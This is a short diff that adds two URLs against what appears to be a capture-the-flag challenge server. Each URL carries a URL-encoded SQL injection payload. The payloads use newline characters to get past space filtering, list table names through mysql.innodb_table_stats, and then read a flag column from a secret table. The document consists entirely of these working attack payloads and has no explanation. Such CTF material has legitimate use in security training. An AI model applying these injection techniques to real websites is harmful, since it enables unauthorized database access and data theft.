@@ -1,0 +1,3 @@
+http://chal.kaibro.tw:9527/index.php?id=9487%27%0aunion%0aselect%0a1,2,table_name%0afrom%0amysql.innodb_table_stats%0alimit%0a2,1%23
+
+http://chal.kaibro.tw:9527/index.php?id=9487%27%0aunion%0aselect%0a1,2,flag%0afrom%0asecret_db.this_is_table_nameXDD%0a%23
